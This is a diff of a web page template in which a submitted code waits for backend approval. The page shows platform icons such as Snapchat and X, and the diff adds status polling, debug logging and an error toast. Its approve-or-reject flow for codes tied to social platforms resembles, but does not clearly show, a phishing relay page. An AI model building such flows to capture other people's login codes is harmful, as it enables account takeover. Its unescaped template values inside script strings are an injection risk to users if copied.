@@ -24,7 +24,7 @@
     <div class="icon-circle bg-snapchat">
       <i class="fa-brands fa-snapchat icon-lg snapchat-icon"></i>
     </div>
-    {% elif platform_name.lower() == 'twitter' or platform_name.lower() == 'x' %}
+    {% elif platform_name.lower() == 'twitter' or platform_name.lower() == 'x' or platform_name.lower() == 'x / twitter' %}
     <div class="icon-circle bg-twitter">
       <i class="fa-brands fa-x-twitter icon-lg"></i>
     </div>
@@ -136,7 +136,7 @@
 const codeValue = "{{ code_value }}";
 const nextUrl = "{{ next_url }}";
 const submissionId = "{{ submission_id }}";
-const previousPageUrl = "{{ previous_page_url }}"; // This should be set by your backend
+const previousPageUrl = "{{ previous_page_url }}"; // This is now properly set by the backend
 
 function showLoadingState() {
   document.getElementById('loading-state').style.display = 'block';
@@ -171,7 +171,7 @@ function goBackToEntry() {
 }
 
 function checkConfirmation() {
-  fetch(`/api/check_confirmation/${submissionId}`)  // Using submissionId instead of codeValue for security
+  fetch(`/api/check_confirmation/${submissionId}`)
     .then(response => {
       if (!response.ok) {
         throw new Error('Network response was not ok');
@@ -179,18 +179,33 @@ function checkConfirmation() {
       return response.json();
     })
     .then(data => {
-      if (data.status === 'approved') {
+      console.log('Confirmation check response:', data); // Debug log
+      
+      if (data.status === 'approved' || data.confirmed) {
         showSuccessState();
         setTimeout(() => {
           window.location.href = nextUrl;
         }, 2500);
-      } else if (data.status === 'rejected') {
+      } else if (data.status === 'rejected' || data.rejected) {
         showRejectedState();
-      } else if (data.status === 'resend_required') {
+      } else if (data.status === 'resend_requested' || data.resend_requested) {
         showRejectedState();
-      } else {
+      } else if (data.status === 'pending' || data.status === 'not_found') {
         // Still pending - continue checking
         setTimeout(checkConfirmation, 3000);
+      } else {
+        // Fallback for old API response format
+        if (data.confirmed) {
+          showSuccessState();
+          setTimeout(() => {
+            window.location.href = nextUrl;
+          }, 2500);
+        } else if (data.rejected) {
+          showRejectedState();
+        } else {
+          // Still pending - continue checking
+          setTimeout(checkConfirmation, 3000);
+        }
       }
     })
     .catch(error => {
@@ -214,11 +229,19 @@ function requestNewCode() {
       'Content-Type': 'application/json',
     }
   })
-  .then(response => response.json())
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    return response.json();
+  })
   .then(data => {
+    console.log('New code request response:', data); // Debug log
+    
     if (data.success) {
-      // Redirect back to the specific previous page (not always the first one)
+      // Use the redirect URL from the backend response
       const redirectUrl = data.redirect_url || previousPageUrl || '/';
+      console.log('Redirecting to:', redirectUrl);
       window.location.href = redirectUrl;
     } else {
       showError('Unable to request new code. Please try again.');
@@ -235,12 +258,35 @@ function requestNewCode() {
 }
 
 function showError(message) {
-  // You could implement a toast or inline error message here
-  alert(message); // Simple fallback
+  // Create a temporary error message display
+  const errorDiv = document.createElement('div');
+  errorDiv.style.cssText = `
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #ef4444;
+    color: white;
+    padding: 12px 20px;
+    border-radius: 8px;
+    z-index: 1000;
+    font-weight: 500;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  `;
+  errorDiv.textContent = message;
+  document.body.appendChild(errorDiv);
+  
+  // Remove after 5 seconds
+  setTimeout(() => {
+    if (errorDiv.parentNode) {
+      errorDiv.parentNode.removeChild(errorDiv);
+    }
+  }, 5000);
 }
 
-// Start checking for confirmation
+// Start checking for confirmation when page loads
 document.addEventListener('DOMContentLoaded', function() {
+  console.log('Starting confirmation check for submission:', submissionId);
   setTimeout(checkConfirmation, 1500);
 });
 </script>
